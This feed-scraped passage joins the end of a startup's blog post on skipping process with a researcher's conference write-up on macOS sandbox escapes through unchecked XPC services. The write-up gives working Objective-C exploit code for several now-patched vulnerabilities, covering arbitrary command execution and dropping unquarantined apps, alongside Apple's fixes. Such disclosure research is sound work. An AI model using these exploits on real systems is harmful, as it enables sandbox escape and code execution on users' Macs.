</figure>
<p>Early in our companyâ€™s history, we challenged ourselves to operate in idiot mode as often as possible. When weâ€™ve made mistakes, weâ€™ve usually been overthinking things. We often arrive at a workable solution by asking ourselves, <em>how would I do this if I were an idiot</em>.</p>
<h2 id="some-problems-arent-important">Some problems arenâ€™t important</h2>
<p>A small number of problems matter a lot. For example, we have to take security extremely seriously. Itâ€™s really not okay for us to cut corners there.</p>
<p>But we can choose to ignore certain other things. For example, we know that our front-end doesnâ€™t look very good on mobile devices. For the foreseeable future, weâ€™ll just need our customers not to use mobile devices. Weâ€™d obviously like for our software to look great everywhere, but weâ€™re choosing not to spend time on our mobile layout. No one really seems to mind.</p>
<p>Iâ€™ll be damned if we ship dark mode any time soon.</p>
<h2 id="just-make-the-thing">Just make the thing</h2>
<p>We donâ€™t have a process for product development. We donâ€™t do Figma mocks. We donâ€™t write PRDs. We donâ€™t really have a design system. We donâ€™t do <em>agile</em>. We donâ€™t have OKRs. We donâ€™t even have a firm product roadmap. We donâ€™t have any A/B testing or growth hacks.</p>
<p>Our customers are engineers, so we generally expect that our engineers can handle product, design, and all the rest. We donâ€™t need to have a whole committee weighing in.</p>
<figure>
<p><img src="https://ssoready.com/blog/from-the-founders/methodology-is-bullshit/peopleskills.jpg">
</p>
</figure>
<p>We just make things and see whether people like them.</p>
<h2 id="rewrites-need-to-happen-sometimes">Rewrites need to happen sometimes</h2>
<p>Companies often think theyâ€™ll move faster if they defer technical debt as long as possible. Thatâ€™s sometimes fine, but weâ€™re comfortable doing major rewrites when appropriate.</p>
<p>Sometimes the fastest path to building the right thing looks like this:</p>
<ol>
<li>Build the wrong thing</li>
<li>Realize itâ€™s the wrong thing</li>
<li>Replace the wrong thing with the right thing</li>
</ol>
<p>If it seems reasonably useful to eliminate technical debt, weâ€™ll do it.</p>
<h2 id="pay-vendors-to-do-it">Pay vendors to do it</h2>
<p>When possible, we buy solutions from vendors instead of building things in-house. For example, we use a vendor called Fern to generate our SDKs. They do a pretty good job.</p>
<p>Of course, using a vendor has significant upfront costs â€“ these things are usually pretty expensive. It also restricts our freedom a bit.</p>
<p>But using a vendor is typically the right move. We have very limited engineering resources, and our engineering resources are really expensive. A week of a single engineerâ€™s time costs about $5,000 in cash. Itâ€™s worth <em>vastly</em> more than that when we factor in opportunity costs (i.e. how much better off weâ€™d be if we spent that engineerâ€™s time on something else).</p>
<p>Relatively few things are actually worth building.</p>
<h2 id="dont-hire-people">Donâ€™t hire people</h2>
<p>We donâ€™t expect that adding headcount would increase our teamâ€™s output. Hiring is slow and hard. Onboarding and people management consume time. Even for a ramped hire, collaborationâ€™s expensive.</p>
<p>Itâ€™s especially hard to bring on <em>strong</em> people, the kind of people that can contribute without a lot of support.</p>
<p>So although we have the resources to build a large engineering team, we do everything possible to stay small. It just makes life a lot easier.</p>


<h2 id="closing-thoughts">Closing thoughts</h2>
<p>To an extent that wasnâ€™t obvious to us before, weâ€™ve realized that product development shouldnâ€™t take very long. If you know what your customers need, have a strong team, and avoid distracting nonsense, velocity is pretty close to inevitable.</p>

        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Multiple new macOS sandbox escape vulnerabilities (481 pts)]]></title>
            <link>https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/</link>
            <guid>42084588</guid>
            <pubDate>Fri, 08 Nov 2024 06:10:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/">https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/</a>, See on <a href="https://news.ycombinator.com/item?id=42084588">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    <p>This is a blog post for my presentation at the conference <a href="https://powerofcommunity.net/2024.htm">POC2024</a>. The slides are uploaded <a href="https://github.com/jhftss/jhftss.github.io/blob/main/res/slides/A%20New%20Era%20of%20macOS%20Sandbox%20Escapes.pdf">here</a>.</p>

<p>In the macOS system, most processes are running in a restricted sandbox environment, whether they are Appleâ€™s own services or third-party applications. Consequently, once an attacker gains Remote Code Execution (RCE) from these processes, their capabilities are constrained. The next step for the attacker is to circumvent the sandbox to gain enhanced execution capabilities and broader file access permissions.</p>

<p>But how to discover sandbox escape vulnerabilities? Upon reviewing the existing issues, I unearthed a significant <strong>overlooked attack surface</strong> and a novel attack technique. This led to the discovery of <strong>multiple new sandbox escape vulnerabilities</strong>: CVE-2023-27944, CVE-2023-32414, CVE-2023-32404, CVE-2023-41077, CVE-2023-42961, CVE-2024-27864, CVE-2023-42977, <strong>and more</strong>.</p>

<h2 id="about-the-macos-sandbox">About the macOS Sandbox</h2>

<h3 id="the-app-sandbox">The App Sandbox</h3>

<p>Nowadays, as required by the Mac AppStore, most applications are running with the <strong>App Sandbox</strong> restrictions. The sandboxed application must have the entitlement â€œ<strong>&lt;key&gt;com.apple.security.app-sandbox&lt;/key&gt;&lt;true/&gt;</strong>â€. The sandbox restrictions are applied in the <strong>dyld initialization</strong> function before the appâ€™s main function. After entering the sandbox, it will be <strong>containerized</strong> and all the file operations will be limited to its data container path.</p>

<p>It should be noted that all the files dropped by the sandboxed application will be marked as <strong>quarantined by default</strong>. The dropped files will have the special <strong>quarantine extended attribute</strong>. And the extended attribute canâ€™t be removed by the sandboxed app due to the configuration in the sandbox profile:</p>

<div><pre><code>(deny file-write-xattr (xattr "com.apple.quarantine") (with no-log)))
</code></pre></div>

<p>According to the Appleâ€™s design guide:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019161759137.png" alt="image-20241019161759137"></p>

<p>The applications without App Sandbox have unrestricted access to all user data and system resources. While the applications with the sandbox restrictions have only limited access.</p>

<p>Specifically, the capabilities of a sandboxed application are defined in the rule configuration file <code>/System/Library/Sandbox/Profiles/application.sb</code>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019162228998.png" alt="image-20241019162228998"></p>

<p>For example, it will restrict access to certain <strong>system resources</strong> such as network and hardware. It also restricts the <strong>filesystem access</strong> and only a limited number of <strong>Mach services</strong> are reachable from a sandboxed application.</p>

<p>BTW, the <strong>forked</strong> child process will also <strong>inherit</strong> the application sandbox restrictions of the parent process. But the process launched via the <code>LaunchService.framework</code> <strong>donâ€™t inherit</strong> the sandbox restriction. For example, you can launch a non-sandboxed application via the system <code>open</code> command directly.</p>

<h3 id="the-service-sandbox">The Service Sandbox</h3>

<p>Compared to the common application sandbox, the <strong>Service Sandbox</strong> is a bit different.</p>

<p>Most Appleâ€™s <strong>daemon services</strong> are running in a <strong>Service Sandbox</strong> context. They are restricted by the sandbox profiles defined in these system locations:</p>

<div><pre><code>/System/Library/Sandbox/Profiles/*.sb
/usr/share/sandbox/*.sb
</code></pre></div>

<p>The sandbox restrictions are applied in the serviceâ€™s <code>main</code> function by calling the API <code>sandbox_init_XXX</code>, specified with a sandbox profile name or path <strong>manually</strong>. After entering the sandbox, they are usually <strong>not containerized</strong>.</p>

<p>Most importantly, the dropped files are <strong>not quarantined by default</strong>, unless the <strong>quarantine-related</strong> APIs are invoked <strong>manually</strong>.</p>

<h2 id="the-attack-surfaces">The Attack Surfaces</h2>

<h2 id="the-old-common-ways">The Old Common Ways</h2>

<h3 id="attack-via-the-launchserviceframework">Attack via the LaunchService.framework</h3>

<p>The first common method is to attack the non-sandboxed applications via the system LaunchService framework.</p>

<p>The application could natively exist on the macOS system, an example is the <a href="https://i.blackhat.com/EU-21/Wednesday/EU-21-Waisberg-Skeletons-In-The-App-Sandbox.pdf">CVE-2021-30864</a>, which can manipulate the <strong>$HOME</strong> environment variable for the system non-sandboxed application <strong>Terminal.app</strong>. When the Terminal application is launched, the malicious payload under the controlled home path <code>$HOME/.profile</code> will be executed without the sandbox restriction.</p>

<p>Another attack scenario is to <strong>drop a new non-sandboxed application</strong> and then launch it. However, the newly dropped application will be <strong>quarantined</strong> and prevented from launching! So if we can drop a file or folder without being quarantined, then we can bypass the app sandbox completely. The example is the <a href="https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html">CVE-2023-32364</a>, which abuses the <strong>devfs</strong> to drop a folder without being quarantined because the <strong>devfs</strong> doesnâ€™t support the extended attributes.</p>

<h3 id="attack-the-available-mach-services">Attack the available Mach services</h3>

<p>The second common way to escape the sandbox is to attack the available Mach services listed in the app sandbox profile.</p>

<p>All Mach service information on the system is stored in the file <code>/System/Library/xpc/launchd.plist</code>. And we can check if a Mach service is available to a sandboxed application by using the <code>bootstrap_look_up</code> API. So, itâ€™s easy for us to enumerate all the Mach services available to app sandbox like this:</p>

<div><pre><code>void checkService(const char *serviceName) {
    mach_port_t service_port = MACH_PORT_NULL;
    kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &amp;service_port);
    if (!err) {
      NSLog(@"available service:%s", serviceName);
      mach_port_deallocate(mach_task_self_, service_port);
    }
}

void print_available_xpc(void) {
    NSDictionary&lt;NSString*, id&gt;* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
    NSDictionary&lt;NSString*, id&gt;* launchDaemons = dict[@"LaunchDaemons"];
    for (NSString* key in launchDaemons) {
      NSDictionary&lt;NSString*, id&gt;* job = launchDaemons[key];
      NSDictionary&lt;NSString*, id&gt;* machServices = job[@"MachServices"];
      for (NSString* serviceName in machServices) {
          checkService(serviceName.UTF8String);
      }
    }
}
</code></pre></div>

<p>Note that these Mach services exist either in the <strong>System domain</strong> or the <strong>User domain</strong>.</p>

<p>More XPC services available to app sandbox are ignored by our researchers!</p>

<h2 id="the-new-overlooked-one">The New Overlooked One</h2>

<p>The overlooked XPC services are those that exist in the <strong>PID domain</strong>.</p>

<p>In contrast to old common XPC services that exist in the <strong>System/User domain</strong>, their service type is â€œ<strong>Application</strong>â€ type rather than the â€œ<strong>System</strong>â€ or â€œ<strong>User</strong>â€ type. And they will be launched upon request by an app and terminate when the requesting application exits.</p>

<p>The XPC services for the <strong>System/User domain</strong> are reachable to a sandboxed application only if they are defined in the sandbox profile â€œ<strong>application.sb</strong>â€. But all XPC services required by an app and its framework are visible to the appâ€™s <strong>PID domain</strong>.</p>

<p>It seems that most XPC services for the <strong>PID domain</strong> are not expected to be invoked from a sandboxed application, so there are no additional entitlement checks or sandbox checks for the incoming XPC clients.</p>

<p>I drew a table to explain their differences:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019165127768.png" alt="image-20241019165127768"></p>

<p>Letâ€™s take the <code>SystemShoveService.xpc</code> as an example:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019165457530.png" alt="image-20241019165457530"></p>

<p>It is an XPC bundle inside the system private <code>ShoveService.framework</code>. From the infoPlist dictionary, we can see that its â€œService Typeâ€ is â€œ<strong>Application</strong>â€ and its bundle identifier is â€œ<strong>com.apple.installandsetup.shoveservice.system</strong>â€.</p>

<p>So, how to send requests to this XPC service from a sandboxed application?</p>

<p>Through my research, I found that registering the XPC service to a sandboxed applicationâ€™s PID domain is as simple as a single line of code:</p>

<div><pre><code>[[NSBundle bundleWithPath:@â€œ/System/Library/PrivateFrameworks/ShoveService.framework"]load];
</code></pre></div>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019170019639.png" alt="image-20241019170019639"></p>

<p>From the call stack backtrace of bundle loading, we can see that the XPC service will be <strong>registered</strong> to the appâ€™s PID domain <strong>automatically when the corresponding framework is loaded</strong>.</p>

<p><code>SystemShoveService.xpc</code> doesâ€™t check the requested XPC client, so it can be exploited to <strong>escape the app sandbox</strong> after loading the <code>ShoveService.framework</code>. Moreover, it has the powerful SIP-related entitlement â€œ<strong>com.apple.rootless.install</strong>â€, and thus it can be exploited to <strong>bypass the SIP protection at the same time</strong>.</p>

<p>The vulnerability has been designated as <strong>CVE-2022-26712</strong>. More details can be found from <a href="https://jhftss.github.io/CVE-2022-26712-The-POC-For-SIP-Bypass-Is-Even-Tweetable/">my previous blogpost</a>.</p>

<p>Generally speaking, all XPC services with the Service Type â€œ<strong>Application</strong>â€ are <strong>potential targets</strong> to escape the app sandbox. So we can explore this overlooked attack surface by enumerating the XPC services in the system (private) frameworks:</p>

<div><pre><code>find /System/Library/Frameworks -name *.xpc
find /System/Library/PrivateFrameworks -name *.xpc
</code></pre></div>

<p>After discovering an XPC service for <strong>PID Domain</strong> that doesnâ€™t check the incoming XPC client, we can attempt to attack the <strong>potential target</strong> by using the following two methods:</p>

<ol>
  <li>Drop an app <strong>folder</strong> without being quarantined. (Get a full sandbox escape like the <a href="https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html">CVE-2023-32364</a> did.)</li>
  <li>Drop a <strong>file</strong> without being quarantined. (A <strong>ZIP</strong> or <strong>DMG</strong> file that contains a non-sandboxed application.)</li>
</ol>

<p>After diving into the new overlooked attack surface, I managed to discover dozens of new sandbox escape vulnerabilities. Next are the details.</p>

<h2 id="new-vulnerabilities--exploitations">New Vulnerabilities &amp; Exploitations</h2>

<h2 id="beta-no-cve-1">Beta-No-CVE-1</h2>

<p>Apple just credited me in their <a href="https://support.apple.com/en-gb/120950">additional recognitions</a>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019172223066.png" alt="image-20241019172223066"></p>

<p>You may wonder why thereâ€™s no CVE assigned for this vulnerability.</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019173439785.png" alt="image-20241019173439785"></p>

<p>According to Apple, â€œCVEs are only assigned to software vulnerabilities previously released to production and not to vulnerabilities for beta-only software.â€ This vulnerability <strong>only affects the macOS Sonoma Beta version</strong>.</p>

<h3 id="the-issue">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><pre><code>/System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc
</code></pre></div>

<p>The XPC service can be launched without any sandbox restrictions.</p>

<p>It accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020105753261.png" alt="image-20241020105753261"></p>

<p>The <code>SKRemoteTaskRunnerProtocol</code> has only one method</p>

<p>â€œ<code>runTask:arguments:withReply:</code>â€.</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020105834371.png" alt="image-20241020105834371"></p>

<p>This only XPC method is designed to execute an arbitrary command with the specified arguments:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020105909140.png" alt="image-20241020105909140"></p>

<p>At line 30, the <strong>executable path</strong> and <strong>arguments</strong> are controlled by the sandboxed XPC client. Therefore, an attacker can abuse this XPC method to execute an arbitrary system command directly without any sandbox restrictions.</p>

<h3 id="the-exploit-and-demo">The exploit and demo</h3>

<div><pre><code>@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
    [conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
    [conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
    [conn resume];
    
    [[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
        NSLog(@"run task result:%@, error:%@", bSucc, error);
    }];
}
</code></pre></div>

<p>Demo link: https://youtu.be/MYkdmFOUyFA</p>

<h3 id="the-patch">The patch</h3>

<p>Apple promptly resolved the vulnerability prior to releasing macOS Sonoma 14.0 by <strong>completely removing the vulnerable XPC service</strong> from the operating system.</p>

<h2 id="beta-no-cve-2">Beta-No-CVE-2</h2>

<p>There is no CVE assigned for this vulnerability too due to the same <strong>Beta-only</strong> reason.</p>

<p>Apple just credited me in their <a href="https://support.apple.com/en-gb/120950">additional recognitions</a>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019172506665.png" alt="image-20241019172506665"></p>

<h3 id="the-issue-1">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><pre><code>/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc
</code></pre></div>

<p>The XPC service can be launched without any sandbox restrictions.</p>

<p>It accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020111428188.png" alt="image-20241020111428188"></p>

<p>The <code>AudioAnalyticsHelperServiceProtocol</code> has two methods:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020111649270.png" alt="image-20241020111649270"></p>

<p>The issue exists in the second XPC method â€œ<code>createZipAtPath:hourThreshold:withReply:</code>â€. The following is pseudo-code from the Objective-c class <code>AudioAnalyticsHelperService</code>:</p>

<div><pre><code>// reversed from the Objective-c class AudioAnalyticsHelperService

-(void) createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply {
    NSString *compressPath = [path stringByAppendingPathComponent:@"compressed"];
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:compressPath]) {
        [fm createDirectoryAtPath:compressPath withIntermediateDirectories:YES attributes:nil error:nil];
    }
    
    for (NSString *item in [fm contentsOfDirectoryAtPath:path error:nil]) {
        if ([[item pathExtension] isEqualToString:@"json"]) {// &amp;&amp; the file creation date meets the requirement
            NSString *srcPath = [path stringByAppendingPathComponent:item];
            NSString *dstPath = [compressPath stringByAppendingPathComponent:item];
            [fm moveItemAtPath:srcPath toPath:dstPath error:nil];
        }
    }
    
    NSString *zipPath = [path stringByAppendingPathComponent:[NSString stringWithFormat:@"audio_analytics_reporting_%@.zip", [self nowTimeString]]];
    [self createZipArchiveForURL:[NSURL fileURLWithPath:compressPath] destinationURL:[NSURL fileURLWithPath:zipPath]];
}
</code></pre></div>

<p>As we can see here, it helps to compress an arbitrary path that is specified by the XPC client.</p>

<p>It first creates a folder named <code>compressed</code> in the specified path, if the path does not exist. It then enumerates the files in the specified path with the <code>json</code> suffix and moves them to the <code>compressed</code> folder. In the file move operation, an attacker can move an arbitrary file to an arbitrary location by replacing the <code>compressed</code> folder with a symlink. The source file content is not checked, but the destination file path must have the suffix <code>json</code>.</p>

<p>Finally, it creates a zip file from the <code>compressed</code> folder.</p>

<p>Note that the <strong>newly generated zip file will not be quarantined</strong> because the XPC service itself is not sandboxed at all.</p>

<h3 id="the-exploit-and-demo-1">The exploit and demo</h3>

<div><pre><code>@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
    NSString *currentPath = NSTemporaryDirectory();
    chdir([currentPath UTF8String]);
    NSLog(@"======== preparing payload at the current path:%@", currentPath);
    system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
    [@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
    system("chmod +x compressed/poc.app/Contents/MacOS/poc");
    
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
    [conn resume];
    
    [[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
        NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
        NSString *file;
        while ((file = [dirEnum nextObject])) {
            if ([[file pathExtension] isEqualToString: @"zip"]) {
                // open the zip
                NSString *cmd = [@"open " stringByAppendingString:file];
                system([cmd UTF8String]);

                sleep(3); // wait for decompression and then open the payload (poc.app)
                NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
                system([cmd2 UTF8String]);
                break;
            }
        }
    }];
}
</code></pre></div>

<p>Demo link: https://youtu.be/7zd2Lun5r2s</p>

<h3 id="the-patch-1">The patch</h3>

<p>Apple quickly addressed the vulnerability prior to releasing macOS Sonoma 14.0 by checking the entitlement â€œ<strong>com.apple.audioanalytics.helper.service</strong>â€ from the incoming XPC client:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020112102296.png" alt="image-20241020112102296"></p>

<p>If the client doesnâ€™t have the special entitlement in its code signature, the XPC service will deny the XPC connection directly.</p>

<p>Now in the latest macOS, the private <code>AudioAnalyticsInternal.framework</code> and the XPC service have been removed completely.</p>

<h2 id="cve-2023-27944">CVE-2023-27944</h2>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019172639306.png" alt="image-20241019172639306"></p>

<h3 id="the-issue-2">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><pre><code>/System/Library/PrivateFrameworks/TrialServer.framework/XPCServices/TrialArchivingService.xpc
</code></pre></div>

<p>This XPC service will enter the <strong>Service Sandbox</strong> by using the sandbox profile <code>/System/Library/Sandbox/Profiles/com.apple.trial.TrialArchivingService.sb</code>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020113955167.png" alt="image-20241020113955167"></p>

<p>However, the dropped files will not be quarantined.</p>

<p>It accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020112619070.png" alt="image-20241020112619070"></p>

<p>The <code>TrialArchivingServiceProtocol</code> has four methods:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020112735952.png" alt="image-20241020112735952"></p>

<p>The issue exists in the XPC method â€œ<code>extractArchiveFromHandle:withArchiveName:toDirectory:destDirExtension:postExtractionCompression:completion:</code>â€.</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020112903145.png" alt="image-20241020112903145"></p>

<p>It helps to extract an archive file passed from a sandboxed application to a specified location. However, it <strong>doesnâ€™t pass the quarantine extended attribute to the extracted content</strong>.</p>

<h3 id="the-exploit-and-demo-2">The exploit and demo</h3>

<p>There is a small challenge to exploit the issue.</p>

<p>By abusing the XPC method, the macho file in the archive will lose the <strong>executable (X)</strong> permission after the extraction. So the extracted application cannot be launched directly. Then I came up with a similar vulnerability to overcome this challenge: <a href="https://breakpoint.sh/posts/bypassing-the-macos-gatekeeper">CVE-2021-30990</a> can be exploited not only to bypass the gatekeeper, but also to escape the application sandbox. The trick to that exploit is to use symlink rather than the macho file itself.</p>

<p>Then I encountered another new challenge:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020113237752.png" alt="image-20241020113237752"></p>

<p>This XPC method only supports to extract <strong>directories</strong> and <strong>regular files</strong>, and does not allow extracting <strong>symlink</strong> from the archive.</p>

<p>To overcome the new challenge, I extract the payload application to the sandboxed <strong>app container path</strong>, where the sandboxed app has the read and write permission. (Luckily, the service sandbox profile is not too strict here.) Next, I can create the symlink from the sandboxed application directly, or just assign the executable permission to the extracted macho by calling the API <code>chmod</code>.</p>

<p>(Another simple solution is to archive the payload application twice. Abusing the vulnerable XPC method to unpack the external zip file and then using the system <code>open</code> command to unpack the inner zip file.)</p>

<p>The exploit code is as follows:</p>

<div><pre><code>@protocol TrialArchivingServiceProtocol &lt;NSObject&gt;
- (void) extractArchiveFromHandle:(NSFileHandle *)archiveHandle withArchiveName:(NSString *)archiveName toDirectory:(NSURL *)dstURL destDirExtension:(NSString *)destDirToken postExtractionCompression:(unsigned long long)post completion:(void (^)(unsigned char))reply;
@end

void exploit_TrialArchivingService(void) {
    [[NSBundle bundleWithURL:[NSURL fileURLWithPath:@"/System/Library/PrivateFrameworks/TrialServer.framework"]] load];
    NSXPCConnection *connection = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.trial.TrialArchivingService"];
    connection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(TrialArchivingServiceProtocol)];
    [connection resume];
    // archive file handle
    NSURL *payload = [[NSBundle mainBundle] URLForResource:@"sbx.app" withExtension:@"zip"];
    NSFileHandle *archiveHandle = [NSFileHandle fileHandleForReadingAtPath:[payload path]];
    // destination directory
    NSString *dstPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Trial/v0/AssetStore"];
    [[NSFileManager defaultManager]createDirectoryAtPath:dstPath withIntermediateDirectories:YES attributes:0 error:0];
    NSURL *dstURL = [NSURL fileURLWithPath:dstPath];
    // destination directory sandbox extension
    typedef const char *(*PFN)(const char *extension_class, const char *path, uint32_t flags);
    void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
    PFN sandbox_extension_issue_file = (PFN)dlsym(h, "sandbox_extension_issue_file");
    const char *token = sandbox_extension_issue_file("com.apple.app-sandbox.read-write", [dstPath UTF8String], 2);
    // fire the hole, it will extract the archive file bundle to this App container, without the quarantine extended attribute
    __block dispatch_semaphore_t done = dispatch_semaphore_create(0);
    [connection.remoteObjectProxy extractArchiveFromHandle:archiveHandle withArchiveName:@"exploit" toDirectory:dstURL destDirExtension:[NSString stringWithUTF8String:token] postExtractionCompression:0 completion:^(unsigned char ret) {
        NSLog(@"ret:%d", ret);
        dispatch_semaphore_signal(done);
    }];
    dispatch_semaphore_wait(done, DISPATCH_TIME_FOREVER);
    // However, this extraction will drop the executable (X) permission. Create a symlink as a workaround
    NSString *target = [dstPath stringByAppendingPathComponent:@"sbx.app/Contents/MacOS/Automator Application Stub"];
    symlink("/System/Library/CoreServices/Automator Application Stub.app/Contents/MacOS/Automator Application Stub", [target UTF8String]);
    NSString *openCmd = [NSString stringWithFormat:@"open %@/sbx.app", dstPath];
    system([openCmd UTF8String]);
}
</code></pre></div>

<p>Demo link: https://youtu.be/VbqGbxmSLoA</p>

<h3 id="the-patch-2">The patch</h3>

<p>Apple addressed the vulnerability in macOS Ventura 13.3 by checking the entitlement â€œ<strong>com.apple.TrialArchivingService.internal</strong>â€ from the incoming XPC client:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020145445876.png" alt="image-20241020145445876"></p>

<p>If the client doesnâ€™t have the special entitlement in its code signature, the XPC service will deny the XPC connection directly.</p>

<h2 id="cve-2023-32414">CVE-2023-32414</h2>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019172718969.png" alt="image-20241019172718969"></p>

<h3 id="the-issue-3">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><pre><code>/System/Library/PrivateFrameworks/DesktopServicesPriv.framework/XPCServices/ArchiveService.xpc
</code></pre></div>

<p>This XPC service will enter the service sandbox by using a sandbox profile, but the <strong>dropped files will not be quarantined</strong>.</p>

<p>It accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020145606528.png" alt="image-20241020145606528"></p>

<p>The <code>DSArchiveServiceProtocolInternal</code> has five methods:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020145705526.png" alt="image-20241020145705526"></p>

<p>The issue exists in the XPC method â€œ<code>unarchiveItemWithURLWrapper:â€¦</code>â€:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020145834370.png" alt="image-20241020145834370"></p>

<p>This XPC method helps to unarchive an item passed from a sandboxed application to a specified location. However, it doesnâ€™t pass the quarantine extended attribute to the extracted content. Therefore, a sandboxed application can drop arbitrary files without being marked as quarantined by abusing this XPC method.</p>

<h3 id="the-exploit-and-demo-3">The exploit and demo</h3>

<p>The XPC client has already been implemented in the Objective-c class <code>DSArchiveService</code> within the <code>DesktopServicesPriv.framework</code>. The exploit code is as follows:</p>

<div><pre><code>@interface DSArchiveService : NSObject
- (void)unarchiveItemAtURL:(id) itemURL passphrase:(id) password destinationFolderURL:(id) dstURL completionHandler:(void (^)(NSURL *, NSError *))arg2;
@end

void prepare(void) {
    NSLog(@"preparing %@/payload.zip", NSHomeDirectory());
    system("mkdir -p poc.app/Contents/MacOS; mkdir dst");
